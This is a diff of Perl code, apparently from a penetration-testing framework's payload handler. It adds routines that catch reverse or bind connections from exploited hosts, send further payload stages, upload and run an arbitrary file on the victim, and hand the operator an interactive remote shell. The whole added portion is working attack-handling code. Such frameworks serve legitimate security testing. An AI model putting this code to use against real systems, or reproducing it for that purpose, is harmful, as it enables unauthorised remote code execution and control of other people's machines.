@@ -275,6 +275,52 @@ sub reverse_shell_staged
     return(1);
 }
 
+# Multistage reverse connect payloads that uploads and execs result in a shell
+sub reverse_shell_staged_upexec
+{
+    my ($self, $exploit) = @_;
+    my $port = $self->GetVar('LPORT');
+
+    if (! open(X, "<".$self->GetVar('PEXEC')))
+    {
+        print STDERR "[*] Error: Please specify a valid path to upload/exec file\n";
+        kill('KILL', $exploit);
+        return;
+    }
+
+    my $victim = $self->Listener($exploit,$port);
+    return(0) if ! $victim;
+    
+    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
+    
+    my $stagecnt = 2;
+    while (my $stage = $self->GetVar('_Payload')->NextStage())
+    {
+        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
+        $victim->send($stage);
+        $stagecnt++;
+    }
+    print STDERR "[*] All stages sent, uploading file\n";
+    
+    my $upload;
+    while (<X>){ $upload.=$_ }
+    close (X);
+    
+    $victim->send(pack('V', length($upload)));
+    $victim->send($upload);
+    print STDERR "[*] Executing uploaded file...\n\n";
+
+    my $console = $self->ConsoleStart();
+    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
+    $callback->("CONNECT", $victim);
+    $self->DataPump($console, $victim, $callback);
+    $self->ConsoleStop($console);
+    $callback->("DISCONNECT", $victim);
+    
+    $victim->close();
+    undef($victim);
+    return(1);
+}
 
 # Multistage bind payloads that result in a shell
 sub bind_shell_staged
@@ -282,6 +328,46 @@ sub bind_shell_staged
      my ($self, $exploit) = @_;
     my $host = $self->GetVar('RHOST');
     my $port = $self->GetVar('LPORT');
+    my $victim = $self->Connector($exploit, $host, $port);
+    return if ! $victim;
+
+    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
+
+    my $stagecnt = 2;
+    while (my $stage = $self->GetVar('_Payload')->NextStage())
+    {
+        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
+        $victim->send($stage);
+        $stagecnt++;
+    }
+    print STDERR "[*] All stages sent, dropping to shell...\n\n";
+
+    my $console = $self->ConsoleStart();
+    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
+    $callback->("CONNECT", $victim);
+    $self->DataPump($console, $victim, $callback);
+    $self->ConsoleStop($console);
+    $callback->("DISCONNECT", $victim);
+    $victim->shutdown(2);
+    $victim->close();
+    undef($victim);
+    return(1);
+}
+
+# Multistage bind payloads that result in a shell
+sub bind_shell_staged_upexec
+{
+    my ($self, $exploit) = @_;
+    my $host = $self->GetVar('RHOST');
+    my $port = $self->GetVar('LPORT');
+    
+    if (! open(X, "<".$self->GetVar('PEXEC')))
+    {
+        print STDERR "[*] Error: Please specify a valid path to upload/exec file\n";
+        kill('KILL', $exploit);
+        return;
+    }
+    
     my $victim = $self->Connector($exploit, $host, $port);    
     return if ! $victim;
 
@@ -294,7 +380,16 @@ sub bind_shell_staged
         $victim->send($stage);
         $stagecnt++;
     }
-    print STDERR "[*] All stages sent, dropping to shell...\n\n";
+    print STDERR "[*] All stages sent, uploading file\n";
+
+    my $upload;
+    while (<X>){ $upload.=$_ }
+    close (X);
+    
+    $victim->send(pack('V', length($upload)));
+    $victim->send($upload);
+    
+    print STDERR "[*] Executing uploaded file...\n\n";
 
     my $console = $self->ConsoleStart();
     my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
